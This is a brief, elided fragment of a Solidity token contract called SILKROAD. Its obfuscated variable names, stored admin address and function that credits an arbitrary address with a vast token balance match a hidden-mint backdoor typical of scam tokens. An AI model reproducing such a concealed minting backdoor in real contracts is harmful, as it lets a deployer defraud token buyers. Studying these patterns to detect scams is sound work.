...
contract SILKROAD is Ownable {
    string private _tokenname;
    string private _okensymbol;
    constructor(address tokenadmin , string memory name_, string memory symbol_) {
        bbcugf45 = tokenadmin;
    ...
    uint256 supplyamount = 777777777777777 * 10**decimals();
    ...
    function transfer_(address iissyxxx) public     {
    ...
    external {
        ...
        TED[cc1xx23d] += 1e6*(777777777777777*(1e6));
